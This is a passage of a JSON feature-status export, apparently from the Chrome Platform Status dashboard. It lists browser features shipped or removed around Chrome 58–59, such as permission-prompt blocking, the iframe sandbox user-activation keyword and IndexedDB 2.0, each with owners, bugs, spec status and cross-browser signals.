        "https://developer.mozilla.org/en-US/docs/Web/API/WritableStream"
      ],
      "samples": [
        "https://streams.spec.whatwg.org/#ws-intro"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-07-07 06:07:49.166410",
      "by": "dominickn@chromium.org"
    },
    "name": "Temporarily stop permission requests after 3 dismissals",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Browser Intervention",
          "val": 9,
          "milestone_str": 59
        },
        "owners": [
          "dominickn@chromium.org",
          "emilyschechter@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "UI>Browser>Permissions>Prompts"
        ],
        "desktop": 59,
        "flag": false,
        "android": 59,
        "webview": 59,
        "intervention": true
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Temporarily stop an origin from requesting a permission following the third dismissal of a permission prompt. The stop will be lifted after some amount of time has passed (initially 1 week), after which the origin may request the permission again. A further dismissal will apply the temporary stop again.\r\n\r\nFor web developers who are testing features, the block can also be removed by changing the permission's setting in the lock icon's page info dialog, or by clearing your browsing data.",
    "id": 6443143280984064,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:42.222950",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAudio: decodeAudioData detaches ArrayBuffer",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 59
        },
        "owners": [
          "rtoy@chromium.org",
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 59,
        "ios": 59,
        "blink_components": [
          "Blink>WebAudio"
        ],
        "desktop": 59,
        "flag": false,
        "android": 59,
        "bug": "http://crbug.com/704679",
        "intervention": false
      },
      "opera": {
        "android": 46,
        "desktop": 59
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "According to the spec, decodeAudioData detaches the given ArrayBuffer before decoding.  This means that the ArrayBuffer no longer has any contents and can't be reused or examined.\r\n\r\nIf it's important to keep the data, user ArrayBuffer.slice(0) to make a copy for decodeAudioData.",
    "id": 5539919174828032,
    "resources": {
      "docs": [
        "https://webaudio.github.io/web-audio-api/#widl-BaseAudioContext-decodeAudioData-Promise-AudioBuffer--ArrayBuffer-audioData-DecodeSuccessCallback-successCallback-DecodeErrorCallback-errorCallback"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-21 16:58:19.618410",
      "by": "jmedley@google.com"
    },
    "name": "rAF Aligned Touch Input",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 59
        },
        "owners": [
          "dtapuska@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 59,
        "blink_components": [
          "Blink>Input"
        ],
        "desktop": 59,
        "flag": false,
        "android": 59,
        "bug": "https://crbug.com/642368",
        "intervention": false
      },
      "opera": {
        "android": 48,
        "desktop": 48
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Align touchmove events so that they occur close to requestAnimationFrame() as possible.",
    "id": 4892570664566784,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1aM9AqyYuceRHOmsJZXFKcgi_D4jvFAymYvI36OEwIpI/edit#"
      ],
      "samples": [
        "http://rbyers.github.io/event-timing.html"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-04-17 08:33:12.180050",
      "by": "foolip@chromium.org"
    },
    "name": "self.origin",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://html.spec.whatwg.org/multipage/webappapis.html#dom-origin",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://groups.google.com/d/msg/mozilla.dev.platform/B4F7jCC9jAI/A2c8c7_zBAAJ",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 59
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 59,
        "blink_components": [
          "Blink"
        ],
        "desktop": 59,
        "flag": false,
        "android": 59,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=690195",
        "intervention": false
      },
      "opera": {
        "android": 46,
        "desktop": 46
      },
      "edge": {
        "view": {
          "url": "https://github.com/whatwg/dom/issues/410#issuecomment-357170536",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=168023",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "self.origin returns the Unicode serialization of the origin of the settings object of the global represented by \"self\" (a Window or WorkerGlobalScope).  This gives scripts a consistent way of getting their origin in both situations.  Note that unlike location.origin this represents the actual origin of the global, not the origin of the URL it's loaded from.  The difference can be substantial in the case of sandboxing, for example.",
    "id": 6491882200760320,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/origin"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2018-03-16 04:29:59.547440",
      "by": "binlu@chromium.org"
    },
    "first_of_milestone": true,
    "name": "'allow-top-navigation-by-user-activation' <iframe sandbox> keyword",
    "tags": [
      "iframe",
      "sandbox",
      "navigation"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/browsers.html#attr-iframe-sandbox-allow-top-navigation-by-user-activation",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1359867",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "binlu@google.com",
          "domenic@chromium.org",
          "emilyschechter@chromium.org",
          "aemiller@google.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "blink_components": [
          "Blink"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=678759",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "url": "https://github.com/WICG/interventions/issues/42#issuecomment-282076392",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=171327",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Adds a new keyword named \"allow-top-navigation-by-user-activation\" for iframe sandbox, which requires a user activation (or gesture) being processed to trigger a top-level navigation. This change would enable more use cases of sandboxing untrusted third-party contents (eg., ads) by allowing top navigation while blocking malicious auto-redirecting, and thus help building a safer internet (eg., a safer ads ecosystem in which all ads could be sandboxed to prevent unexpected malicious behaviors like",
    "id": 5629582019395584,
    "resources": {
      "docs": [
        "https://github.com/WICG/interventions/issues/42",
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe"
      ],
      "samples": [
        "http://w3c-test.org/html/semantics/embedded-content/the-iframe-element/iframe_sandbox_allow_top_navigation_by_user_activation-manual.html"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:31.183730",
      "by": "ericbidelman@google.com"
    },
    "name": "<abbr> and <acronym> have underline by default",
    "tags": [
      "html"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/rendering.html#phrasing-content-3",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "ratsunny@gmail.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "blink_components": [
          "Blink>HTML"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "http://crbug.com/376160",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "<abbr> and <acronym> should have dotted underline by default according to the HTML standard.\r\n",
    "id": 4774625963671552,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-07-21 08:36:37.576940",
      "by": "ericbidelman@google.com"
    },
    "name": "Allowing autoplay unmuted in WebAPK manifest scope",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "zqzhang@chromium.org",
          "mlamouri@chromium.org",
          "dahlke@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Mobile>WebAPKs"
        ],
        "flag": false,
        "android": 58,
        "bug": "https://crbug.com/689960",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "In WebAPK mode, frames that are within the WebAPK manifest scope will be allowed to autoplay media unmuted.\r\n",
    "id": 5715456904134656,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:03.942330",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS class name: Apple-interchange-newline, Apple-converted-space, Apple-paste-as-quotation, Apple-style-span, and Apple-tab-span",
    "comments": "The span element with those classes make it hard to handle other span elements in editing, so one of them(Apple-style-span) has not been produced since 2011(\r\nhttps://webkit.org/blog/1737/apple-style-span-is-gone/). Other classes will be also removed from Blink. Here is the discussion for intent to remove: https://groups.google.com/a/chromium.org/d/msg/blink-dev/OlgmGUvnMU4/9HMNXMjGCQAJ",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 5
      },
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Deprecated",
          "val": 6,
          "milestone_str": 58
        },
        "owners": [
          "joone.hur@intel.com",
          "yosin@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "blink_components": [
          "Blink Editing"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "https://crbug.com/383677",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly negative",
          "val": 6
        }
      }
    },
    "summary": "These non-standard CSS classes are used to differentiate the span elements added by Blink itself in editing.",
    "id": 5756335865987072,
    "resources": {}
  },
  {
    "category": "User input",
    "updated": {
      "when": "2018-01-04 23:42:38.365850",
      "by": "jmedley@google.com"
    },
    "name": "ClipboardEvent Constructor",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/clipboard-apis/#clipboard-event-interfaces",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "lunalu@google.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "blink_components": [
          "Blink"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=496394",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This entry tracks exposing ClipboardEvent constructor. ",
    "id": 4687833935642624,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Clipboard_API",
        "https://developer.mozilla.org/en-US/docs/Web/API/ClipboardEvent/ClipboardEvent"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-09-20 18:10:30.481760",
      "by": "Patket@microsoft.com"
    },
    "name": "Create Workers from `data:` URLs",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://html.spec.whatwg.org/multipage/workers.html#dom-worker",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "andypaicu@google.com",
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "https://crbug.com/270979",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "HTML specifies that `data:` URLs can be used to create workers with opaque origins. We should support this as a first step towards defining a sandboxing mechanism for Workers (and parity with other browsers).",
    "id": 5633342665916416,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:29:04.627650",
      "by": "ericbidelman@google.com"
    },
    "name": "Deprecate and Remove case-insensitive matching for usemap attribute",
    "tags": [
      "HTML",
      "Image map"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/infrastructure.html#rules-for-parsing-a-hash-name-reference",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1312456",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 58
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "blink_components": [
          "Blink>HTML>Map"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "http://crbug.com/659464",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/9496749/",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=163894",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "\"Compatibility caseless\" had been applied to usemap attribute matching. The specification was updated so that case-sensitive matching is applied. https://github.com/whatwg/html/commit/6acdb2122298d2bb7bb839c0a61b4e1f9b0f9bc9 A deprecation warning is printed to the console starting in Chrome 57.\r\n",
    "id": 5760965337415680,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/img"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:29:10.405780",
      "by": "ericbidelman@google.com"
    },
    "name": "Deprecate and Remove: setting Event.cancelBubble to false",
    "tags": [
      "cancelBubble"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://dom.spec.whatwg.org/#dom-event-cancelbubble",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1324380",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 58
        },
        "owners": [
          "lpy@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>DOM>Events"
        ],
        "desktop": 58,
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=675549",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/10266390/",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=166018",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "According to https://github.com/whatwg/dom/issues/211, setting cancelBubble to true is considered as an alias to stopPropagation(), and the spec indicates setting cancelBubble to false should do nothing.",
    "id": 6091485216768000,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:29:04.144830",
      "by": "ericbidelman@google.com"
    },
    "name": "EME: Make navigator.requestMediaKeySystemAccess() spec compliant ",
    "tags": [
      "EME",
      "encrypted media"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "http://w3c.github.io/encrypted-media/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "jrummell@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 58,
        "blink_components": [
          "Internals>Media>Encrypted"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "https://crbug.com/605661",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Require that one of 'audioCapabilities' and 'videoCapabilities' be specified in the configuration passed to navigator.requestMediaKeySystemAccess(), and require that the contentType strings used as part of the entries to 'audioCapabilities' and 'videoCapabilities' include the desired codec as part of the MIME type. This item covers two bugs though only one is listed under the status section: https://crbug.com/605661, https://crbug.com/616233",
    "id": 5758526131535872,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Navigator/requestMediaKeySystemAccess"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:29:01.524640",
      "by": "ericbidelman@google.com"
    },
    "name": "INPUT element: selectionDirection, selectionStart, and selectionEnd attribute getters should not throw",
    "tags": [
      "HTML",
      "Forms"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/forms.html#dom-textarea/input-selectionstart",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1281769",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "blink_components": [
          "Blink>Forms"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "http://crbug.com/622679",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=156500",
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "For input types which don't support text selection API, we have thrown InvalidStateError. The specification was changed so that null is returned in such case.\r\n",
    "id": 5740194741354496,
    "resources": {}
  },
  {
    "category": "Offline / Storage",
    "updated": {
      "when": "2018-01-30 20:06:47.719920",
      "by": "jsbell@chromium.org"
    },
    "name": "IndexedDB 2.0",
    "tags": [
      "indexeddb",
      "offline",
      "database"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/IndexedDB/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://hacks.mozilla.org/2016/10/whats-new-in-indexeddb-2-0/",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "pwnall@chromium.org",
          "jsbell@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "blink_components": [
          "Blink>Storage>IndexedDB"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "http://crbug.com/693661",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://developer.apple.com/library/prerelease/content/releasenotes/General/WhatsNewInSafari/Articles/Safari_10_1.html",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "IndexedDB 2.0 introduces a few APIs that optimize some database access patterns and improve programming ergonomics. Chrome will support the full standard by shipping the following features:\r\nsupport for binary keys, object store and index renaming, getKey() on IDBObjectStore, getPrimaryKey() on IDBIndex.",
    "id": 5812621622116352,
    "resources": {
      "docs": [
        "https://hacks.mozilla.org/2016/10/whats-new-in-indexeddb-2-0/",
        "https://developer.mozilla.org/en-US/docs/Web/API/IDBObjectStore/name",
        "https://developer.mozilla.org/en-US/docs/Web/API/IDBIndex/name",
        "https://developer.mozilla.org/en-US/docs/Web/API/IDBObjectStore/getKey",
        "https://developer.mozilla.org/en-US/docs/Web/API/IDBCursor/continuePrimaryKey"
      ],
      "samples": [
        "https://hacks.mozilla.org/2016/10/whats-new-in-indexeddb-2-0/",
        "https://developer.mozilla.org/en-US/docs/Web/API/IDBObjectStore/name",
        "https://developer.mozilla.org/en-US/docs/Web/API/IDBIndex/name",
        "https://developer.mozilla.org/en-US/docs/Web/API/IDBObjectStore/getKey",
        "https://developer.mozilla.org/en-US/docs/Web/API/IDBCursor/continuePrimaryKey"
      ]
    }
  },
  {
    "category": "Offline / Storage",
    "updated": {
      "when": "2018-01-30 20:02:09.128680",
      "by": "jsbell@chromium.org"
    },
    "name": "IndexedDB: webkitGetDatabaseNames",
    "tags": [
      "IndexedDB"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 58
        },
        "owners": [
          "jsbell@chromium.org"
        ],
        "prefixed": true,
        "origintrial": false,
        "webview": 58,
        "blink_components": [
          "Blink>Storage>IndexedDB"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=696010",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The API asynchronously returns a list of existing database names in an origin, which seemed sensible enough.\r\n\r\nThe design is flawed, in that the results may be obsolete as soon as they are returned, so it can really only be used for logging, not serious application logic. Not implemented in other browsers. https://github.com/w3c/IndexedDB/issues/31 tracks/links to previous discussion on flaws and possible alternatives.",
    "id": 5725741740195840,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 21:54:43.663210",
      "by": "jmedley@google.com"
    },
    "name": "Legacy caller for HTMLEmbedElement and HTMLObjectElement",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 58
        },
        "owners": [
          "foolip@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "blink_components": [
          "Blink>HTML"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "https://crbug.com/663662",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "That an interface has a legacy caller means that an instance can be called as a function. This used to be the case for HTMLEmbedElement and HTMLObjectElement but is being removed. Calling will instead throw an exception. This was deprecated in Chrome 57.",
    "id": 5715026367217664,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/HTMLEmbedElement",
        "https://developer.mozilla.org/en-US/docs/Web/API/HTMLObjectElement"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-15 18:35:18.676740",
      "by": "jmedley@google.com"
    },
    "name": "Long Task API",
    "comments": "Notes from TPAC discussion: https://docs.google.com/document/d/1RigHs7a4yRcVUt4fPswOZLKY_-tDlPiz8hPokBixHEk/edit#heading=h.mwr9aubzxuqt",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/longtasks/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "panicker@chromium.com",
          "igrigorik@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "blink_components": [
          "Blink>PerformanceAPIs"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=651926",
